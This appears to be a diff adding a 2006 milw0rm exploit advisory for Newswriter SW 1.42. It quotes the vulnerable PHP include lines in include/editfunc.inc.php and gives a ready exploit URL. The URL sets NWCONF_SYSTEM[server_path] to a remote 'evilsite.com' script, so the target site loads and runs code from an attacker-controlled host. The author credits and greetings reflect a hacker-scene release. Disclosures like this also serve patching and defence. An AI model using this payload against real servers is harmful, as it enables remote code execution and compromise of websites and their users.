@@ -1,0 +1,45 @@
+#==============================================================================================
+#Newswriter SW <= 1.42 (NWCONF_SYSTEM[server_path]) Remote File Inclusion Vulnerability
+#===============================================================================================
+#
+#Critical Level : Dangerous
+#
+#Script Dowload : http://www.baumedia.net/typo3conf/ext/nf_downloads/pi1/passdownload.php?downloaddata=3
+#
+#Version : 1.42
+#
+#================================================================================================
+#
+#Bug in :
+#
+#include/editfunc.inc.php
+#================================================================================================
+#
+#Vulnerable Code :
+#
+#
+#         include($NWCONF_SYSTEM['server_path'].'include/javascript.inc'.$NWCONF_SYSTEM['php_ext']);
+#         require($NWCONF_SYSTEM['server_path'].'include/text-out.inc'.$NWCONF_SYSTEM['php_ext']);
+#         require($NWCONF_SYSTEM['server_path'].'include/images.inc'.$NWCONF_SYSTEM['php_ext']);
+#         require($NWCONF_SYSTEM['server_path'].'include/filefunc.inc'.$NWCONF_SYSTEM['php_ext']);
+#
+#================================================================================================
+#
+#Exploit :
+#--------------------------------
+#
+#http://sitename.com/[Newswriter_SW_DIR]/include/editfunc.inc.php?NWCONF_SYSTEM[server_path]=http://evilsite.com/evilscript.txt?
+#
+#
+#================================================================================================
+#Discoverd By : Silahsiz Kuvvetler
+#
+#
+#Conatact : co-type[at]hotmail[dot]com
+#
+#GreetZ : FaTTaLGazI- Narcotic - 0xyGen
+#
+#Special Thanqs : www.fatalerror.us
+#==================================================================================================
+
+# milw0rm.com [2006-09-27]
